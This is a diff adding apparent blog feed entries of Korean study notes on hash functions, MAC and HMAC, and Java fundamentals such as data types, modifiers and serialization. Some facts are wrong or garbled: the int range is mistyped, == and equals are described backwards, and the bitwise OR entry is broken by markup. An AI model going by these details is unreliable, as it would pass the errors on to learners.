+        &lt;p&gt;Hash Function : 하나의 문자열을 보다 빨리 찾을 수 있도록 주소에 직접 접근할 수 있는 짧은 길이의 값이나 키로 변환하는 알고리듬을 수식으로 표현한 것. 즉 해싱함수 h(k)는 어떤 키 k에 대한 테이블 주소를 계산하기 위한 방법으로 주어진 키 값으로부터 레코드가 저장되어 있는 주소를 산출해 낼 수 있는 수식을 말한다. 문자열을 찾을 때 문자를 하나하나 비교하며 찾는 것보다 문자열에서 해시 키를 계산하고 그 키에 해당하는 장소에 문자열을 저장해 둔다면, 찾을 때는 한 번의 계산만으로도 쉽게 찾을 수 있게 된다.&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;해시 함수 또는 해시 알고리즘은 임의의 데이터로부터 일종의 짧은 “전자 지문”을 만들어 내는 방법이다. 해시 함수는 데이터를 자르고 치환하거나 위치를 바꾸는 등의 방법을 사용해 결과를 만들어 내며, 이 결과를 흔히 해시 값(hash value)라고 한다. 해시 함수는 결정론적으로 작동해야 하며, 따라서 두 해시 값이 다르다면 그 해시 값에 대한 원래 데이터도 달라야 한다. (역은 성립하지 않는다) 해시 함수의 질은 모든 입력 대상에 대해 얼마나 적은 해시충돌을 일으키냐로 결정되는데, 충돌이 많이 날 수록 서로 다른 데이터를 구별하기 어려워지고 데이터를 검색하는 비용이 늘기 때문이다. &lt;em&gt;(출처 : &lt;a href=&quot;http://ohgyun.com/433&quot;&gt;ohgyun.com&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;해시의 장점
+    &lt;ol&gt;
+      &lt;li&gt;짧고, 고정길이이다&lt;/li&gt;
+      &lt;li&gt;중복을 방지할 수 있다&lt;/li&gt;
+      &lt;li&gt;메세지 구조를 숨길 수 있다&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;특징 (&lt;em&gt;출처 : &lt;a href=&quot;http://goo.gl/ZfPXv&quot;&gt;MIT Presentation&lt;/a&gt;&lt;/em&gt;)
+    &lt;ol&gt;
+      &lt;li&gt;충돌 저항성 (Collision resistance) : 같은 해시 값을 생성하는 두 개의 입력값을 찾는 것이 거의 계산상 불가능하다.&lt;/li&gt;
+      &lt;li&gt;일방향 함수 (One-way) : 해시 값으로 메세지를 추측하기 불가능하다&lt;/li&gt;
+      &lt;li&gt;추측불가 (Unpredictability) : 두개의 값으로 변경하는 경우, 나머지 하나를 알더라도 해시 값을 추측할 수 없다&lt;/li&gt;
+      &lt;li&gt;추출 (Extraction) : 메세지의 길이가 달라도 고정 길이를 리턴한다&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;MAC (&lt;em&gt;출처 : &lt;a href=&quot;http://blog.naver.com/ksh396/220432279260&quot;&gt;Naver Blog&lt;/a&gt;&lt;/em&gt;)
+    &lt;ul&gt;
+      &lt;li&gt;Message Authentication Code, 인증된 메세지코드라는 의미&lt;/li&gt;
+      &lt;li&gt;이것이 필요한 이유는 해당 메세지의 intergrity와 authentication을 보장하기 위함이다. 
+        &lt;ul&gt;
+          &lt;li&gt;intergrity : message가 변경되지 않았음을 의미&lt;/li&gt;
+          &lt;li&gt;authentication : 올바른 송신자로부터 왔다는 것을 의미&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;MAC은 임의의 길이 메세지와 송신자와 수신자가 공유하는 key를 기반으로 하여 고정 비트 길이코드를 출력한다. &lt;/li&gt;
+      &lt;li&gt;기존에 hash함수에서 intergrity를 만족시킬 수 있었는데, 이것에 key를 더하여 인증에 개념까지 추가된 것이다.&lt;/li&gt;
+      &lt;li&gt;MAC 인증개요
+        &lt;ul&gt;
+          &lt;li&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;hmac&quot;&gt;HMAC&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;;Hash-based Message Authentication Code&lt;/li&gt;
+  &lt;li&gt;일방향성 hash 함수를 이용해서 메세지 인증코드를 구성하는 방법이다. &lt;/li&gt;
+  &lt;li&gt;강한 일방향성 해시 함수라면 무엇이든지 HMAC에 사용될 수 있다.&lt;/li&gt;
+  &lt;li&gt;Replay Attack을 HMAC을 통해 막을 수 있는 방법
+    &lt;ul&gt;
+      &lt;li&gt;sequence number : 송신 메세지에 매회 증가하는 번호를 사용&lt;/li&gt;
+      &lt;li&gt;timestamp : 송신 메세지에 현재 시간을 넣음&lt;/li&gt;
+      &lt;li&gt;nonce : 메세지를 수신하기에 앞서 수신자는 송신자에게 nonce값을 전달함&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/08/20/자바</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/08/20/%EC%9E%90%EB%B0%94.html"/>
+        <title>Java</title>
+        <updated>2015-08-20T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/08/20/%EC%9E%90%EB%B0%94.html</uri>
+        </author>
+        <content type="html">&lt;h2 id=&quot;java-&quot;&gt;&lt;em&gt;Java 학습공간&lt;/em&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;최신업데이트 일자  : 2015. 08. 28
+&lt;br /&gt;
+추가할 내용 : 국내 자바도서 3권, Effective Java, 여러 Article, Java 7-8 업데이트 내용&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;자만은 금물
+&lt;br /&gt;
+부족함은 모자름이 없다. 
+&lt;br /&gt;
+익숙해진 느낌이 든다면 부족해졌다 생각하자.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;자바&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;완벽한 객체지향언어로서 코드의 화려함보다는 소프트웨어의 구조를 중요시한다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;java-bytecode&quot;&gt;자바 바이트코드(Java bytecode)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;자바 컴파일러에 의해서 생성되는 코드를 가리켜 “자바 바이트코드”라 하는데, 
+&lt;br /&gt;
+이는 자바 컴파일러에 의해서 생성되는 코드의 명령어 크기가 1바이트이기 때문에 붙여진 이름이다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;자바가 지니는 속도의 핸디캡&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;대부분의 소프트웨어는 속도보다 안전성이 우선시 된다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;물론 속도는 중요하다. 하지만 여기서 말하는 속도는 소프트웨어의 개발 속도이다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;개발중인 소프트웨어의 90% 이상은 인터넷, 네트워크 기반 소프트웨어이다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;인터넷, 네트워크상에서는 소프트웨어의 속도보다 데이터의 전송속도가 더 중요하다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;속도가 문제가 되면 대부분의 개발자들은 데이터베이스를 먼저 의심한다. 그리고 그곳에서 대부분 문제를 발견하고 해결한다&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;자바의 자료형&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;boolean&lt;/th&gt;
+      &lt;th&gt;참과 거짓&lt;/th&gt;
+      &lt;th&gt;1바이트&lt;/th&gt;
+      &lt;th&gt;true, false&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;char&lt;/td&gt;
+      &lt;td&gt;문자&lt;/td&gt;
+      &lt;td&gt;2바이트&lt;/td&gt;
+      &lt;td&gt;모든 유니코드 문자 (유니코드라 2바이트)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;byte&lt;/td&gt;
+      &lt;td&gt;정수&lt;/td&gt;
+      &lt;td&gt;1바이트&lt;/td&gt;
+      &lt;td&gt;-128 ~ 127&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;short&lt;/td&gt;
+      &lt;td&gt;정수&lt;/td&gt;
+      &lt;td&gt;2바이트&lt;/td&gt;
+      &lt;td&gt;-32768 ~ 32767&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;int&lt;/td&gt;
+      &lt;td&gt;정수&lt;/td&gt;
+      &lt;td&gt;4바이트&lt;/td&gt;
+      &lt;td&gt;-214783648 ~ 2147483647&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;long&lt;/td&gt;
+      &lt;td&gt;정수&lt;/td&gt;
+      &lt;td&gt;8바이트&lt;/td&gt;
+      &lt;td&gt;-9223372036854775808&lt;br /&gt; ~ 9223372036854775807&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;float&lt;/td&gt;
+      &lt;td&gt;실수&lt;/td&gt;
+      &lt;td&gt;4바이트&lt;/td&gt;
+      &lt;td&gt;-1.40 x 10^-45 ~ -3.40 x 10^38&lt;br /&gt;+1.40 x 10^-45 ~ +3.40 x 10^38&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;double&lt;/td&gt;
+      &lt;td&gt;실수&lt;/td&gt;
+      &lt;td&gt;8바이트&lt;/td&gt;
+      &lt;td&gt;-4.94 x 10^-324 ~ -1.79 x 10^308 &lt;br /&gt;+4.94 x 10^-324 ~ +1.79 x 10^308&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-3&quot;&gt;자바의 정수형 연산&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;단순히 메모리 공간만 가지고 보면 적은 메모리를 사용하는 변수를 Short와 같은 자료형을 사용하는게 좋을것 같지만
+&lt;br /&gt;
+중요한 사실은 정수연산의 관점에서는 다르다는 것이다.
+&lt;br /&gt;
+일반적으로 우리가 사용하는 CPU는 int형 정수연산을 가장 고속으로 처리하게끔 설계되어 있다
+&lt;br /&gt;
+따라서 자바는 정수형 연산을 진행할 때(덧셈이건 뺄셈이건), 모든 피연산자를 int형으로 변환하는 과정을 거친다.
+&lt;br /&gt;
+때문에 정수형 연산을 위해서 short 자료형보다는 int형의 실행속도가 더 빠르다
+&lt;br /&gt;
+단, long형에서의 int형으로의 변환은 일어나지 않는다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-4&quot;&gt;자바에서의 실수 자료형 선택기준&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;4바이트로 표현되는 float는 6자리의 정밀도 (소수점 이하 6자리 정밀도)를 가지고
+&lt;br /&gt;
+double은 15자리의 정밀도(소수점 이하 15자리의 정밀도)를 갖기 때문에, 
+&lt;br /&gt;
+표현하고자 하는 값에서 요구하는 정밀도를 기준으로 자료형을 선택하게 된다
+&lt;br /&gt;
+소수점 이하 15자리까지 오차가 발생하지 않는다고 해도, 그 이하부터는 오차가 발생하기 때문에, 
+&lt;br /&gt;
+오차가 존재하는 double형 변수 둘 이상을 더하다 보면, 소수점 이하 15자리가 아니라, 
+&lt;br /&gt;
+소수점 이하 셋째 자리에서도 오차가 발생할 수 있다.
+&lt;br /&gt;
+따라서 실수의 계산은 기본적으로 오차가 존재한다고 인식해야 한다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;char-&quot;&gt;Char 자료형&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;하드웨어가 숫자밖에 인식을 못하니 문자를 숫자로 표현하는 수밖에 없다. 
+&lt;br /&gt;
+그래서 문자를 숫자로 표현하기 위한 몇몇 표준이 프로그래밍 언어에 상관없이 만들어졌는데,
+&lt;br /&gt;
+자바는 이 중에서 유니코드(unicode)라는 표준을 근거로 문자를 표현하고 있다.
+&lt;br /&gt;
+유니코드는 문자 하나를 2바이트로 표현하는 문자체계이다. 
+&lt;br /&gt;
+2바이트로 표현할 수 있는 데이터의 수는 2의 16승 개이므로 
+&lt;br /&gt;
+총 6만개 이상의 문자표현이 가능하다는 계산이 나온다.
+&lt;br /&gt;
+따라서 유니코드는 세계의 모든 언어를 표현할 수 있는 문자체계이다.
+&lt;br /&gt;
+문자는 작은 따옴표로 표현이 된다
+&lt;br /&gt;
+char형 변수는 문자의 저장을 위해 사용된다.
+&lt;br /&gt;
+char형 변수에 실제 저장되는 것은 저장되는 문자의 유니코드 상수 값이다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;int-num--15&quot;&gt;int num = 1+5&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;여기서 1+5는 변수의 상대적 개념인 상수(=리터럴)라 부른다. 
+&lt;br /&gt;
+상수라 부르는 이유는 값이 변경될 수 없기 때문이다
+&lt;br /&gt;
+하지만 상수도 메모리 공간에 저장이된다. 
+&lt;br /&gt;
+CPU를 통해서 연산이 이루어지기 때문이다.
+&lt;br /&gt;
+해당 연산의 상수들은 기본자료형으로 표현 및 저장된다
+&lt;br /&gt;
+모든 정수형 상수는 int형으로
+&lt;br /&gt;
+모든 실수형 상수는 double형으로 
+&lt;br /&gt;
+그래서 long으로 선언된 자료형에 저장하려고 해도 접미사를 붙여야 하는 것이다
+&lt;br /&gt;
+그래서 float로 선언된 자료형에 저장하려고 해도 접미사를 붙여야 하는 것이다        &lt;br /&gt;
+          : &lt;em&gt;자바 컴파일러는 상황에서 값의 크기를 기준으로 판단하지 않고, 값의 표현에 사용되는 바이트 크기를 기준으로 판단을 한다.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-5&quot;&gt;자동 형 변환&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;프로그래머가 별도의 형 변환 명령을 내리지 않아도 형 변환이 발생하는 대표적인 사례
+&lt;br /&gt;&lt;em&gt;double num1 = 20;&lt;/em&gt;
+&lt;br /&gt;
+int형 정수 20이 double형 실수 20.0으로 자동 형 변환되어 변수에 저장된다.
+&lt;br /&gt;
+&lt;br /&gt;하지만 다음의 경우에는 자동으로 형 변환이 발생하지 않는다
+&lt;br /&gt;&lt;em&gt;int num2 = 20.5; -&amp;gt; 컴파일 에러&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+이처럼 자바에서는 데이터의 손실이 발생하지 않거나, 발생하더라도 그 손실이 제한적인 경우에만 자동 형 변환을 허용한다.
+&lt;br /&gt;
+다음은 자바에서 정의하고 있는 자동 형 변환 규칙이다
+&lt;br /&gt;&lt;em&gt;byte -&amp;gt; short(or char) -&amp;gt; int -&amp;gt; long -&amp;gt; float -&amp;gt;double&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;short-circuit-evaluationlazy-evaluation&quot;&gt;논리 연산자와 Short-Circuit Evaluation(Lazy Evaluation)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;가장 빠르게 연산을 진행하기 위한 계산방식
+&lt;br /&gt;
+(A) &amp;amp;&amp;amp; (B) : A가 false이면 B는 확인하지 않는다
+&lt;br /&gt;
+(A)  ||  (B) : A가 true이면 B는 확인하지 않는다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-6&quot;&gt;비트 연산자&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&amp;amp; : 비트단위로 AND 연산을 한다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;table&gt;
+          &lt;tbody&gt;
+            &lt;tr&gt;
+              &lt;td&gt;: 비트단위로 OR 연산을 한다*&lt;/td&gt;
+            &lt;/tr&gt;
+          &lt;/tbody&gt;
+        &lt;/table&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;^ : 비트단위로 XOR 연산을 한다 (서로다르면 1, 같으면 0)&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;~ : 모든 비트를 반전시켜서 얻은 결과를 반환&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-7&quot;&gt;비트 쉬프트 연산자&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; &amp;lt;&amp;lt; : 비트 열을 왼쪽으로 이동&amp;lt;2의 배수의 곱&amp;gt; (ex 2 &amp;lt;&amp;lt;1 = 4, 2 &amp;lt;&amp;lt; 2 = 8, 2 &amp;lt;&amp;lt; 3 = 16) : 이동에 따른 빈 공간은 0으로 채운다
+ &amp;gt;&amp;gt; : 비트 열을 오른쪽으로 이동&amp;lt;2의 배수의 나눗셈&amp;gt; (ex 8 &amp;gt;&amp;gt; 1 = 4, 8 &amp;gt;&amp;gt; 2 = 2) : 이동에 따른 빈 공간은 음수의 경우 1, 양수의 경우 0으로 채운다
+ &amp;gt;&amp;gt;&amp;gt; : 피연산자의 비트 열을 오른쪽으로 이동
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-8&quot;&gt;자바의 이름규칙&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;기본적으로 Camel Convention
+&lt;br /&gt;
+상수는 대문자, 두단어 이상의 합성어는 _를 포함&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-9&quot;&gt;클래스 패스의 지정&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;패스는 경로의 의미를 지닌다.
+&lt;br /&gt;
+클래스 패스는 “클래스의 경로(클래스가 존재하는 경로)”를 뜻한다.
+&lt;br /&gt;
+자바 가상머신은 프로그램의 실행과정에서 실행에 필요한 클래스를 찾을 때, 바로 이 클래스 패스를 기준으로 찾게 된다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-10&quot;&gt;자바에서 패키지를 분리하는 이유&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;여러 팀간의 같은 Naming으로 인한 충돌을 방지하기 위해&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;소스파일들의 경계에 의미를 부여&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;패키지간의 의존관계를 확인하기 위해 (접근제어를 분리하기 위해)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-11&quot;&gt;자바의 지시자&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;지시자&lt;/th&gt;
+      &lt;th&gt;클래스 내부&lt;/th&gt;
+      &lt;th&gt;동일 패키지&lt;/th&gt;
+      &lt;th&gt;상속받은 클래스&lt;/th&gt;
+      &lt;th&gt;이외의 영역&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;private&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;default&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;protected&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;X&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;public&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+      &lt;td&gt;O&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;pre&gt;&lt;code&gt; 기타 지시자
+      final
+           변경할 수 없음을 의미
+           클래스, 내부 클래스, 메소드, 변수에 선언 가능
+           클래스에 선언하면 다른 클래스가 이 클래스를 상속할 수 없음
+           메소드에 선언하면 다른 클래스에서 이 메소드를 오버라이딩 할 수 없음
+           변수에 선언하면 일단 값이 할당된 이후에는 더 이상 값을 변경할 수 없음
+      abstract
+           메소드 몸체를 가질 수 없음
+           메소드의 몸체를 하위 클래스에서 정의하게 하고 싶을 때 사용하는 제한자
+           abstract가 선언된 메소드를 추상 메소드라고 한다
+           추상 메소드를 포함한 클래스는 반드시 abstract로 선언해야 하며 이를 추상 클래스라 한다
+           추상 클래스를 사용하기 위해서는 상속해서 미구현 메소드를 구현해야 한다
+      static  
+           메소드나 변수를 메모리에 로딩해서 다른 클래스가 이 클래스의 인스턴스를 생성하지 않고도 사용할 수 있게 해준다
+           내부 클래스, 메소드, 변수에 선언 가능
+           인스턴스 또는 클래스명으로 접근가능
+      native
+           다른 언어로 작성된 메소드를 자바에서 사용하기 위해 선언하는 제한자
+           메소드에만 선언 가능
+           메소드 몸체를 가질 수 없다
+      synchronized
+           하나 이상의 스레드가 코드의 특정 블록을 동시에 접근하는 것을 제어하기 위해 사용
+           메소드와 블록에 선언가능
+      transient (JPA는 @Transient이지만, 이것은 자바의 예약어으로 transient int age와 같이 사용한다)
+           직렬화 객체 데이터 중 일부의 데이터를 여러가지 이유로 전송하고 싶지 않을 경우,
+           이러한 변수는 직렬화에서 제외해야 되며, 이를 위해서 변수에 transient를 선언한다
+      volatile
+           http://thswave.github.io/java/2015/03/08/java-volatile.html
+           http://kwanseob.blogspot.kr/2012/08/java-volatile.html
+           최적화(reordering) 방지 및 멀티스레드 환경에서 데이터캐쉬가 일어나지 않도록 하는것 
+           (항상 메인메모리에서 읽도록, 최신의 값을 가져오도록)
+           즉 보통 공유되는 static 데이터에 적합
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-12&quot;&gt;자바의 클래스 제어 지시자&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; 접근제어자의 종류
+      public
+           ex : public class A{}
+           소스파일의 이름과 일치해야 한다
+
+      default (접근제어자 선언 X) : 
+           ex : class A{}
+           동일한 패키지 내에서만 접근이 가능하다
+
+ 기타 제어자의 종류
+      static
+           메소드나 변수를 메모리에 로딩해서 다른 클래스가 
+           이 클래스의 인스턴스를 생성하지 않고도 사용할 수 있게 해준다     
+           내부 클래스에서 사용가능
+      final
+           다른 클래스에서 이 클래스를 상속받을 수 없음
+      abstract
+           하위 클래스에서 abstract method를 구현하게끔 강제
+
+ 테스트
+      public class A 에 public 생성자 - 다른패키지에서 import 가능, 접근가능
+      class A 에 public 생성자 - 다른패키지에서 import 불가
+      public class A 에 default 생성자 - 다른패키지에서 import 가능, 접근불가
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-13&quot;&gt;자바 콘솔입력&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
+String str = br.readLine();
+int num = Integer.parseInt(str);
+
+Scanner sc = new Scanner(System.in)
+int num = sc.nextInt(); //nextLine() -&amp;gt; String 반환
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-14&quot;&gt;객체 관계&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;is a (상속)
+&lt;br /&gt;
+has a (복합관계)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;serializable&quot;&gt;직렬화 (Serializable)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;데이터를 파일에 쓰거나, 네트워크를 타고 다른 곳에 전송할 때는 데이터를 바이트 단위로 분해하여 순차적으로 보내야 한다. 이것을 직렬화(Serialization)라고 한다.
+&lt;br /&gt;
+기본 자료형은 정해진 바이트의 변수이기 대문에 바이트 단위로 분해하여 전송한 후 다시 조립하는데 문제가 없다.
+&lt;br /&gt;
+하지만 객체의 크기는 가변적이며, 객체를 구성하는 자료형들의 종류와 수에 따라 객체의 크기는 다양하게 바뀔 수 있다.
+&lt;br /&gt;
+이런 객체를 직렬화 하기 위해서 Serializable 인터페이스를 구현하게 된다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-15&quot;&gt;직렬화가 가능한 객체의 조건&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;기본형 타입&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Serializable 인터페이스를 구현한 객체여야 한다.&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;해당 객체의 멤버들 중에 Serializable 인터페이스가 구현되지 않은게 존재하면 안된다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;transient가 사용된 멤버는 전송되지 않는다&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;객체 직렬화는 객체에 implements Serializable만 선언해 주면 된다&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-16&quot;&gt;자바 가상머신의 메모리 모델&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt; 메모리 분류방식
+      메소드 (method area)
+           : 메소드의 바이트코드 -&amp;gt; 프로그램의 흐름을 구성하는 바이트 코드, 
+             사실상 컴파일 된 바이트코드의 대부분이기 때문에, 전체 바이트코드가 올라간다고 봐도 무리가 없다, 
+             당연히 static 메소드도 포함된다
+           : static 변수
+
+      스택 (stack area)
+           : 지역변수
+           : 매개변수
+
+      힙 (heap area)
+           : 인스턴스
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;object-&quot;&gt;Object 클래스&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;finalize 메소드 : 인스턴스가 소멸되기 직전에 자바 가상머신에 의해서 자동으로 호출되는 메소드, 그러나 호출보장이 안된다 (gc타이밍은 예측불가. gc가 동작해도 인스턴스의 완전한 소멸은 유보될 수 있기 때문에, 그래서 공식처럼 System.gc(); System.runFinalization()을 쓴다는데 이런짓 하지마라)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;equals 메소드 : 동일성, 동등성 ( == 로 비교하는건 무조건 동등성, equals는  기본적으로 동등성 비교인데 오버라이드해서 동일성비교하도록 한다)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;copy
+&lt;br /&gt;
+1. shallow copy : reference를 복사 -&amp;gt; Clonable Interface 참조
+&lt;br /&gt;
+2. deep copy : 새로운 reference를 생성해서 참조한다 -&amp;gt; Clonable Interface 참조, clone 메서드를 오버라이딩해서 직접구현&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;wrapper-&quot;&gt;Wrapper 클래스&lt;/h3&gt;
+
+&lt;blockquote&gt;
